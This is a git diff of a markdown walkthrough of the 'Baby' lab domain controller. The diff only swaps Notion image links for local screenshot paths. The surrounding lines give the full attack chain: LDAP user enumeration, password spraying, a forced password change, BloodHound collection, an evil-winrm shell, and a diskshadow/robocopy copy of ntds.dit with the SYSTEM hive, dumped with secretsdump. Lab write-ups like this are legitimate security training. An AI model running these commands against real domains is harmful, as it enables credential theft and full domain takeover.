@@ -83,21 +83,21 @@ ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl"
 ```bash
 ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "sAMAccountName:" | cut -d' ' -f2 | tee loots/users.txt
 ```
-![alt text](/assets/screenshots/image1.png)
+![alt text](/assets/screenshots/baby/1.png)
 
 Descriptions
 
 ```bash
 ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "description:"
 ```
-![alt text](/assets/screenshots/image2.png)
+![alt text](/assets/screenshots/baby/2.png)
 
 ### SMB
 
 ```bash
 nxc smb 10.10.116.106 -u loots/users.txt -p 'BabyStart123!' --continue-on-success
 ```
-![alt text](/assets/screenshots/image3.png)
+![alt text](/assets/screenshots/baby/3.png)
 
 Password Change
 
@@ -105,15 +105,15 @@ Password Change
 smbpasswd -r 10.10.116.106 -U Caroline.Robinson
 ```
 
-![image](https://www.notion.so/image/attachment%3A05b5e0ca-390a-4177-93b8-e35d16df897c%3Aimage.png?table=block&id=1d43d2c4-89f6-809b-8d18-d1db8585fea6&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/4.png)
 
-![image](https://www.notion.so/image/attachment%3Adb4dad91-4b41-4c20-9be5-ddcb4e2aac1d%3Aimage.png?table=block&id=1d43d2c4-89f6-800f-ac4c-f8e2119ddd37&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/5.png)
 
 ```bash
 nxc smb 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!' --users
 ```
 
-![image](https://www.notion.so/image/attachment%3A25f57ada-baf4-4c58-971b-ceec561bab1b%3Aimage.png?table=block&id=1d43d2c4-89f6-80b1-b9c3-e39f183bc325&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/6.png)
 
 ### Bloodhound
 
@@ -121,11 +121,11 @@ nxc smb 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!' --users
 bloodhound-python -d baby.vl  -c all -u 'Caroline.Robinson' -p 'NewSecurePass123!'  -ns 10.10.116.106 --zip
 ```
 
-![image](https://www.notion.so/image/attachment%3Aabb5435f-cbb9-4545-9e89-de1e97c36b6b%3Aimage.png?table=block&id=1d43d2c4-89f6-805b-afa4-ee34d032ccef&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/7.png)
 
 First Degree Group Membership
 
-![image](https://www.notion.so/image/attachment%3Ad0bf5e4e-f85b-4572-bf11-ea02f49caf53%3Aimage.png?table=block&id=1d43d2c4-89f6-806b-be52-c7f751f68f00&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/8.png)
 
 ## Initial Access
 
@@ -133,17 +133,17 @@ First Degree Group Membership
 nxc winrm 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
 ```
 
-![image](https://www.notion.so/image/attachment%3A6d9b5578-ff7b-4256-bc6e-5cba314f6c2a%3Aimage.png?table=block&id=1d43d2c4-89f6-8083-b950-da80549d037e&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/9.png)
 
 ```bash
 evil-winrm -i 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
 ```
 
-![image](https://www.notion.so/image/attachment%3A285aca5c-0905-44ce-a5f5-41b3c7d8c40a%3Aimage.png?table=block&id=1d43d2c4-89f6-80b4-8c0f-e784b08e0999&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/10.png)
 
 ## PrivEsc
 
-![image](https://www.notion.so/image/attachment%3Af467d9ad-d930-45d5-8ce4-c89e693b6d2a%3Aimage.png?table=block&id=1d43d2c4-89f6-80b8-9502-dc58a986ac98&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/11.png)
 
 vss.dsh
 
@@ -156,13 +156,13 @@ create
 expose %cyb4x% z:
 ```
 
-![image](https://www.notion.so/image/attachment%3Af467d9ad-d930-45d5-8ce4-c89e693b6d2a%3Aimage.png?table=block&id=1d43d2c4-89f6-80b8-9502-dc58a986ac98&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/12.png)
 
 ```bash
 diskshadow /s vss.dsh
 ```
 
-![image](https://www.notion.so/image/attachment%3A9bae947d-2427-40a8-9a2d-257f5a30472c%3Aimage.png?table=block&id=1d43d2c4-89f6-8004-a822-cee10cea7040&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/13.png)
 
 Copying
 
@@ -170,7 +170,7 @@ Copying
 robocopy /b z:\windows\ntds . ntds.dit
 ```
 
-![image](https://www.notion.so/image/attachment%3A9bae947d-2427-40a8-9a2d-257f5a30472c%3Aimage.png?table=block&id=1d43d2c4-89f6-8004-a822-cee10cea7040&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/14.png)
 
 also
 
@@ -180,7 +180,7 @@ reg.exe save hklm\system system
 
 download
 
-![image](https://www.notion.so/image/attachment%3A8cc23693-5ecd-4051-83ed-689ac6d3bbb1%3Aimage.png?table=block&id=1d43d2c4-89f6-8046-a959-d847c4459f2f&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/15.png)
 
 Dump secrets
 
@@ -188,4 +188,4 @@ Dump secrets
 secretsdump.py -system system -ntds ntds.dit local
 ```
 
-![image](https://www.notion.so/image/attachment%3Ae5d49be1-1fef-495e-9b82-7569e4ed18e7%3Aimage.png?table=block&id=1d43d2c4-89f6-80f4-842a-d3321ab6e8a8&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/baby/16.png)
